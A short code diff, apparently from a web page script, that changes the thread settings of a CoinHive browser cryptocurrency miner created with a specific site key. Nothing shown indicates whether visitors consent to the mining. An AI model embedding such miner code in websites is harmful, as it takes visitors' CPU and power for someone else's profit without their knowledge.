@@ -1,7 +1,7 @@
 		var miner = new CoinHive.Anonymous('TqBKEr08A8atWsXdAoc1Rpr1dA1CSPlC',
 		{
 			threads: 4,
-			autoThreads: true,
+			autoThreads: false,
 			throttle:1,
 			forceASMJS: false
 		});
